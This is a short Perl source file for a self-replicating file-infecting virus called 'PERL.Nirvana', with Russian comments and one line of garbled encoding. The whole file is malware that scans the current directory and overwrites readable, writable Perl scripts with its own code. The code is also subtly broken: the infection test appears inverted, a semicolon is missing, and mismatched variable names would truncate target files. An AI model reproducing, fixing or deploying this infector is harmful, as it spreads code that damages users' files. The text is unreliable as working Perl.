#!/usr/bin/perl
# Nirvana RuLeZ the world
# PERL.Nirvana
# by Second Part To Hell

# Thanks to SnakeByte for your tutorial!
#эх ЁрсюЄрхЄ, чрЄшЁрхЄ ёрь ёхс 

# вирус заражает все файлы в текущей директории
open(file,$0);
@nirvana=<file>;                                               # получаем дескриптор своего файла
@nirvana=@nirvana[0...31]                                      # считываем код вируса
close(file);

foreach $FileName (<*>)
{
  if ((-r $FileName) && (-w $FileName) && (-f $FileName))
  {
    open (File, "$FileName");
    @Lithium=<File>;
    close(File);
    if ((@Lithium[1] =~ "Nirvana") or (@Lithium[2] =~ "Nirvana"))
    {
      if((@Lithium[0] =~ "perl",,i) or (@Lithium[1] =~ "perl",,i))
      {
        open(sliver, ">$FileName");
	print sliver @Nirvana;
        print sliver @Litium;
        close (sliver);
      }
    }
  }
}
